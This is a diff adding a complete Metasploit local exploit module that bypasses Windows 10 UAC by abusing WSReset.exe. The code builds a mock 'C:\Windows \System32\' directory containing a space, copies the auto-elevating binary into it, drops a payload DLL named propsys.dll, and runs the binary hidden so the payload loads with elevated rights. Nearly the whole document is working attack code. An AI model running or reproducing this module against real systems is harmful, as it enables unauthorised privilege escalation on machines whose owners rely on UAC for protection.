@@ -1,0 +1,139 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ManualRanking
+
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+  include Post::Windows::Priv
+  include Post::Windows::Runas
+
+  def initialize(info = {})
+    super(
+      update_info( info,
+        'Name'          => 'Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe)',
+        'Description'   => %q{
+        This module exploits a flaw in the WSReset.exe Windows Store Reset Tool. The tool
+        is run with the "autoElevate" property set to true, however it can be moved to
+        a new Windows directory containing a space (C:\Windows \System32\) where, upon
+        execution, it will load our payload dll (propsys.dll).
+        },
+        'License'       => MSF_LICENSE,
+        'Author'        => [
+          'ACTIVELabs', # discovery
+          'sailay1996', # poc
+          'timwr',      # metasploit module
+        ],
+        'Platform'      => ['win'],
+        'SessionTypes'  => ['meterpreter'],
+        'Targets'       => [[ 'Automatic', {} ]],
+        'DefaultTarget' => 0,
+        'DefaultOptions' => {
+          'EXITFUNC'     => 'process',
+          'WfsDelay'     => 15
+        },
+        'DisclosureDate'  => 'Aug 22 2019',
+        'Notes'           =>
+        {
+          'SideEffects' => [ ARTIFACTS_ON_DISK, SCREEN_EFFECTS ],
+        },
+        'References'    => [
+          ['URL', 'https://heynowyouseeme.blogspot.com/2019/08/windows-10-lpe-uac-bypass-in-windows.html'],
+          ['URL', 'https://github.com/sailay1996/UAC_bypass_windows_store'],
+          ['URL', 'https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e'],
+        ],
+      )
+    )
+  end
+
+  def check
+    if sysinfo['OS'] =~ /Windows 10/ && is_uac_enabled? && exists?("C:\\Windows\\System32\\WSReset.exe")
+      return CheckCode::Appears
+    end
+    CheckCode::Safe
+  end
+
+  def exploit
+    if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86
+      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')
+    end
+
+    # Make sure we have a sane payload configuration
+    if sysinfo['Architecture'] != payload.arch.first
+      fail_with(Failure::BadConfig, 'The payload should use the same architecture as the target')
+    end
+
+    check_permissions!
+
+    case get_uac_level
+    when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,
+      UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,
+      UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT
+      fail_with(Failure::NotVulnerable,
+                "UAC is set to 'Always Notify'. This module does not bypass this setting, exiting...")
+    when UAC_DEFAULT
+      print_good('UAC is set to Default')
+      print_good('BypassUAC can bypass this setting, continuing...')
+    when UAC_NO_PROMPT
+      print_warning('UAC set to DoNotPrompt - using ShellExecute "runas" method instead')
+      shell_execute_exe
+      return
+    end
+
+    exploit_win_dir = "C:\\Windows \\"
+    exploit_dir = "C:\\Windows \\System32\\"
+    exploit_file = exploit_dir + "WSReset.exe"
+    unless exists? exploit_win_dir
+      print_status("Creating directory '#{exploit_win_dir}'...")
+      session.fs.dir.mkdir(exploit_win_dir)
+    end
+    unless exists? exploit_dir
+      print_status("Creating directory '#{exploit_dir}'...")
+      session.fs.dir.mkdir(exploit_dir)
+    end
+    unless exists? exploit_file
+      session.fs.file.copy("C:\\Windows\\System32\\WSReset.exe", exploit_file)
+    end
+
+    payload_dll = "C:\\Windows \\System32\\propsys.dll"
+    print_status("Creating payload '#{payload_dll}'...")
+    payload = generate_payload_dll
+    write_file(payload_dll, payload)
+    print_status("Executing WSReset.exe...")
+    begin
+      session.sys.process.execute("cmd.exe /c \"#{exploit_file}\"", nil, {'Hidden' => true})
+    rescue ::Exception => e
+      print_error(e.to_s)
+    end
+    print_warning("This exploit requires manual cleanup of the '#{exploit_win_dir}' and '#{exploit_dir}' directories!")
+  end
+
+  def check_permissions!
+    unless check == Exploit::CheckCode::Appears
+      fail_with(Failure::NotVulnerable, "Target is not vulnerable.")
+    end
+    fail_with(Failure::None, 'Already in elevated state') if is_admin? || is_system?
+    # Check if you are an admin
+    # is_in_admin_group can be nil, true, or false
+    print_status('UAC is Enabled, checking level...')
+    vprint_status('Checking admin status...')
+    admin_group = is_in_admin_group?
+    if admin_group.nil?
+      print_error('Either whoami is not there or failed to execute')
+      print_error('Continuing under assumption you already checked...')
+    else
+      if admin_group
+        print_good('Part of Administrators group! Continuing...')
+      else
+        fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')
+      end
+    end
+
+    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]
+      fail_with(Failure::NoAccess, 'Cannot BypassUAC from Low Integrity Level')
+    end
+  end
+end
